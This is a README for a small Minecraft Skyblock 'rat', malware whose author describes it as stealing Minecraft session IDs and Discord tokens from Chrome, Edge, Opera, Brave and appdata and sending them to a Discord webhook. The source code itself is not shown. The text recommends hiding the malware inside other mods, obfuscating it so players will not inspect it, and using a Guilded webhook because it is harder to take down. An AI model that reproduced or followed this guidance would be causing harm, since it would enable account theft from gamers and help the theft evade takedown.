# Skyblock-8Kb-Rat
-------------------
Small 8kb rat that sends all information to a discord webhook.



Info:
A small skyblock rat that I used to use back in 2021, descently small and can be imbeded into another mod without much issues. The rat will grab ssid and discord info. The discord info is grabbed from browsers suck as: Chrome, Edge, Opera, Brave, and the appdata on the pc.

As long as the file is obfuscated properly many sb players dont seem to check the link out as they are to scared.
If you wanna improve this replace the discord webhook with a guilded webhook as they cant be nuked and have to reported directly to guilded's staff team in order for them to be taken down.
